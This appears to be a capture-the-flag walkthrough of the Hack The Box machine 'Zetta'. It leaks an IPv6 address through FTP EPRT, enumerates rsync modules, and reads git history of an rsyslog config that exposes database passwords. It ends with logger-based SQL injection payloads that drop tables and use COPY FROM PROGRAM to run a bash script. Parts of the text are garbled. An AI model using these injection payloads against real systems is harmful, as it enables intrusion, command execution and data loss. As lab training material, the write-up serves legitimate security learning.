@@ -1,0 +1,105 @@
+The result of the standard nmap scan tell us that we have only 3 ports opened: FTP, SSH and HTTP.
+Poking around with the web server we start the enumeration, to find possible breach through the machine.
+Enumerating the web app we discover a page that gives us some credentials and we can also read something strange, they implemented ipv6.
+Then after reading the RFC standards with ipv6 and FTP we discovered that we can leak the ipv6 of the machine using the FTP, using also the credentials gave us before.
+So we can set up a ncat listener on our machine, and making an ipv6 connection from the FTP server to leak the ipv6 of the victim machine using the ftp commands EPRT and LIST
+
+EPRT |2|dead:beef:2:112f|5282|
+LIST
+
+and we got a callback and the ipv6 was successfully leaked
+
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::5282
+Ncat: Listening on 0.0.0.0:5282
+Ncat: Connection from dead:beef::250:56ff:feb9:b819.
+Ncat: Connection from dead:beef::250:56ff:feb9:b819:56492.
+
+Running a new full nmap scan with the ipv6, we discover a new port opened 8730 that seemed running rsync
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+bin             Backup access to /bin
+boot            Backup access to /boot
+lib             Backup access to /lib
+lib64           Backup access to /lib64
+opt             Backup access to /opt
+sbin            Backup access to /sbin
+srv             Backup access to /srv
+usr             Backup access to /usr
+var             Backup access to /var
+
+commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
+Author: root <root@zetta.htb>
+Date:   Sat Jul 27 05:51:43 2019 -0400
+
+    Adding/adapting template from manual.
+
+diff --git a/pgsql.conf b/pgsql.conf
+index f31836d..9649f68 100644
+--- a/pgsql.conf
++++ b/pgsql.conf
+@@ -1,5 +1,22 @@
+ ### Configuration file for rsyslog-pgsql
+ ### Changes are preserved
+ 
+-module (load="ompgsql")
+-*.* action(type="ompgsql" server="localhost" db="Syslog" uid="rsyslog" pwd="")
++# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
++#
++# Used default template from documentation/source but adapted table
++# name to syslog_lines so the Ruby on Rails application Maurice is
++# coding can use this as SyslogLine object.
++#
++template(name="sql-syslog" type="list" option.sql="on") {
++  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
++  property(name="msg")
++  constant(value="','")
++  property(name="timereported" dateformat="pgsql" date.inUTC="on")
++  constant(value="')")
++}
+INSERT INTO syslog_lines (message, devicereportedtime) values ('','')"
++
++# load module
++module(load="ompgsql")
++
++# Only forward local7.info for testing.
++local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+
+commit c98d292ac2981c0192a59d7cdad9d2d4a25bd4c5
+Author: root <root@zetta.htb>
+Date:   Sat Jul 27 03:11:22 2019 -0400
+
+    Initial revision.
+
+diff --git a/pgsql.conf b/pgsql.conf
+new file mode 100644
+index 0000000..f31836d
+--- /dev/null
++++ b/pgsql.conf
+@@ -0,0 +1,5 @@
++### Configuration file for rsyslog-pgsql
++### Changes are preserved
+
+logger -p local7.info "',now());DROP TABLE IF EXISTS pentestlab;CREATE TABLE pentestlab (t TEXT);INSERT INTO pentestlab(t) VALUES(\$$ idk \$$);SELECT * FROM pentestlab;COPY pentestlab(t) TO \$$/tmp/pentestlab\$$;-- -"
+tail -f /var/log/postgresql/postgresql-11-main.log
+
+sup3rs3cur3p4ass@postgres
+
+logger -p local7.info "',now());DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_outp
+ut text);COPY cmd_exec FROM PROGRAM \$$ bash /tmp/idk.sh \$$;-- -"
